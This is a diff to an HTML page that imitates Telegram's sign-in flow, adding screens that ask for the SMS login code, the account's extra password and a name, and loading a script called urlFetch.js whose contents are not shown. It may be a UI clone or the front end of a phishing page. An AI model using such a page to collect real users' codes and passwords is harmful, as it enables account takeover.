@@ -6,13 +6,13 @@
     <link rel="stylesheet" href="./assets/css/style.css" type="text/css">
   </head>
   <body>
-    <div class="login_page_wrap">
+    <div class="login_page_wrap signPage">
       <div class="container">
 
         <div class="login_page_wrap_logo">
           <img src="assets/img/login/logoLogin.jpg" alt="">
         </div>
-        <form class="login_page_wrap_form">
+        <div class="login_page_wrap_form">
 
           <h1>Sign in to Telegram</h1>
           <p>Please confirm your number and enter your phone number.</p>
@@ -64,7 +64,7 @@
 
           </div>
 
-        </form>
+        </div>
 
 
 
@@ -75,13 +75,89 @@
         <div class="login_page_wrap_logo">
           <img src="/Design/Monkey/" alt="">
         </div>
-        <div class="input_container">
+        <div class="login_page_wrap_form">
 
-          <input type="number" class="form_default form_default--code" placeholder="Code" name="Code" value="">
+          <h1 class="headerNum"></h1>
+          <p>We have sent you an SMS <br> with the code.</p>
+
+          <div class="input_container">
+
+            <input type="tel" class="form_default form_default--code" autocomplete="off" maxlength="5" placeholder="Code" name="Code" value="" id="codeInpit">
+            <label for="codeInpit" class="inputLabel--off codeLabel">Code Invalid</label>
+
+          </div>
 
         </div>
       </div>
     </div>
+
+    <div class="login_page_wrap passPage">
+      <div class="container">
+        <div class="login_page_wrap_logo">
+          <img src="/Design/Monkey/" alt="">
+        </div>
+        <div class="login_page_wrap_form">
+
+          <h1>Enter the password</h1>
+          <p>Your account is protected with an additional password.</p>
+
+          <div class="input_container pass_container">
+            <!-- ____ -->
+
+            <input type="password" class="form_default form_default--pass" autocomplete="on" maxlength="18" placeholder="Enter your password" name="Pass" value="" id="passInput">
+            <img class="input_show_button" src='./icons/eye1_svg.svg' alt="">
+            <label for="passInput" class="inputLabel passLabel">Password</label>
+
+            <!-- ____ -->
+          </div>
+          <div class="input_container submit_container">
+
+            <div class="form_default--next passNext" value="NEXT">
+              <span>NEXT</span>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="login_page_wrap namePage">
+      <div class="container">
+        <div class="login_page_wrap_logo">
+          <img class="addPhotoButton" fill="white" src="./Design/Icons/cameraadd_svg.svg" alt="">
+        </div>
+        <div class="login_page_wrap_form">
+
+          <h1>Your Name</h1>
+          <p>Enter your name and add <br> a profile picture</p>
+
+          <div class="input_container input_container--name">
+
+            <input type="text" class="form_default form_default--name" autocomplete="on" maxlength="18" placeholder="Enter your name" name="Name" value="" id="nameInput">
+            <label class="inputLabel nameLabel" for="nameInput">Name</label>
+
+          </div>
+          <div class="input_container input_container--lastName">
+
+            <input type="text" class="form_default form_default--lastName" autocomplete="on" maxlength="18" placeholder="Enter your last name" name="Name" value="" id="lastNameInput">
+            <label class="inputLabel lastNameLabel" for="lastNameInput">Last Name (optional)</label>
+
+          </div>
+          <div class="input_container submit_container">
+
+            <div class="form_default--next" value="NEXT">
+              <span>START MESAGING</span>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+
     <script type="text/javascript" src="assets/js/loginPage.js"></script>
+    <script type="text/javascript" src="urlFetch.js">
+
+    </script>
   </body>
 </html>
